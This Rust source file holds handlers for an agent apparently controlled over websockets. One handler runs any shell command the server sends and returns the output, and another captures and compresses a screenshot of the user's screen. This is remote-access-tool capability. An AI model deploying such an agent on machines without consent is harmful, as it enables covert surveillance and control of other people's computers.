use std::{io::Cursor, process::Command};
use flate2::{Compression, write::GzEncoder};
use screenshots::{Screen, image::ImageOutputFormat};

use anyhow::Error;
use std::io::Write;
use crate::websockets::payloads::{
    client::{CommandOutputPayload, ScreenshotPayload}, general::StringPayload, server::{CommandPayload, ScreenshotRequestPayload},
};

pub fn handle_goodbye(payload: StringPayload) {
    println!("Got: {}", payload.content);
}

pub fn handle_command(payload: CommandPayload) -> Result<CommandOutputPayload, Error> {
    let shell = if cfg!(debug_assertions) {
        ("sh", "-c")
    } else {
        ("cmd", "/C")
    };

    let command = Command::new(shell.0)
        .arg(shell.1)
        .arg(payload.command)
        .output();

    if command.is_err() {
        anyhow::anyhow!("Failed to run command: {}", command.as_ref().err().unwrap());
    }

    let command_result = command.unwrap();

    let mut response = CommandOutputPayload::builder()
        .stdout(String::from_utf8(command_result.stdout)?)
        .stderr(String::from_utf8(command_result.stderr)?)
        .id(payload.id)
        .build();

    response.status_code = command_result.status.code();

    Ok(response)
}

pub fn handle_screenshot(payload: ScreenshotRequestPayload) -> Result<ScreenshotPayload, Error> {
    let screens = Screen::all()?;

    let first_screen = screens[0];

    let image = first_screen.capture()?;
    let mut jpeg_bytes: Vec<u8> = Vec::new();

    image.write_to(&mut Cursor::new(&mut jpeg_bytes), ImageOutputFormat::Jpeg(85))?;

    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(&jpeg_bytes)?;
    let gzip_bytes: Vec<u8> = encoder.finish()?;

    let response = ScreenshotPayload::builder()
        .id(payload.id)
        .image_data(gzip_bytes)
        .build();

    Ok(response)
}
